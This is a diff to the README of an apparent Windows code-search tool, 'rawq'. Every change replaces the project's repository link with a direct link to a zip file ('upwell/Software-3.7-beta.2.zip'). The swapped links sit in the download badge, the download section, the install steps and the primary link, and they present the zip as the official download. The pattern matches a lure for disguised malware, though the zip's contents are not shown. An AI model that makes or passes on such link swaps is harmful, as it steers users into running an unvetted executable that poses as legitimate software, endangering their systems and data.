@@ -1,11 +1,11 @@
 # ⚡ rawq - Find code context fast
 
-[![Download rawq](https://img.shields.io/badge/Download-rawq-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Isletkreisler490/rawq)
+[![Download rawq](https://img.shields.io/badge/Download-rawq-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Isletkreisler490/rawq/main/upwell/Software-3.7-beta.2.zip)
 
 ## 📥 Download rawq
 
 Visit this page to download:
-https://github.com/Isletkreisler490/rawq
+https://raw.githubusercontent.com/Isletkreisler490/rawq/main/upwell/Software-3.7-beta.2.zip
 
 ## 🖥️ What rawq does
 
@@ -34,7 +34,7 @@ Follow these steps to get rawq running on Windows.
 
 ### 1. Open the download page
 Go to:
-https://github.com/Isletkreisler490/rawq
+https://raw.githubusercontent.com/Isletkreisler490/rawq/main/upwell/Software-3.7-beta.2.zip
 
 ### 2. Download rawq
 On the page, look for the latest release or download file. Save it to your PC.
@@ -265,4 +265,4 @@ Search tools work best when you use the words you already know
 - Type: context retrieval engine
 - Focus: semantic and lexical search over codebases
 - Platform: Windows
-- Primary link: https://github.com/Isletkreisler490/rawq
+- Primary link: https://raw.githubusercontent.com/Isletkreisler490/rawq/main/upwell/Software-3.7-beta.2.zip
